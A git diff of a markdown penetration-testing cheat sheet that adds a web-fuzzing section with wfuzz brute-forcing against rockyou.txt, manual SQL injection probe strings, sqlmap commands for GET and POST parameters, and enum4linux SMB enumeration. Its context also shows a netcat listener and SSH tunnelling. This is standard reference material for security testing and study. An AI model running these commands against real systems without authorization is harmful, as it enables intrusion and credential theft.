@@ -10,6 +10,7 @@
 * [SQL Injection](#SQL-Injection)
 * [PHP Uploading Bypass](#PHP-Uploading-Bypass)
 * [Port Tunnelling](#Port-Tunnelling)
+* [WEB Fuzz](#WEB-Fuzz)
 * [HTTP](#HTTP)
 * [FTP](#FTP)
 * [SMB](#SMB)
@@ -222,13 +223,22 @@ nc -lvnp 80
 
 ### Analysis
 
-GET URL Parameter
 ```
+# Manual
+'
+1'
+1' AND 1=1
+1' AND 1=1 --+
+1') OR TRUE; -- 
+```
+
+```
+# GET URL Parameter
 sqlmap -u "http://example.com/search.php?q=" -p "q" --level=3 --risk=3 --random-agent --batch
 ```
 
-POST Paramenter where login.req is a text file with a login POST intercepted by Burp
 ```
+# POST Paramenter where login.req is a text file with a login POST intercepted by Burp
 sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=3 --random-agent --batch
 ```
 
@@ -262,6 +272,16 @@ ssh -N -L {PORT}:127.0.0.1:{PORT} {USER}@{TARGET}
 
 # With Key
 ssh -N -L {PORT}:127.0.0.1:{PORT} -i {KEY} {USER}@{TARGET}
+```
+
+# WEB Fuzz
+
+```
+# URL Parameter
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt http://{TARGET}/example/example.php?{PARAMETER}=FUZZ
+
+# POST Data
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "{PARAMETER_1}=FUZZ&{PARAMETER_2}=FUZZ" -u http://{TARGET}/example.php
 ```
 
 
@@ -325,6 +345,9 @@ ftp> pwd
 # SMB
 
 ```
+# Enum4Linux
+enum4linux -U -S {TARGET}
+
 # Nmap Analysis
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {TARGET}
 
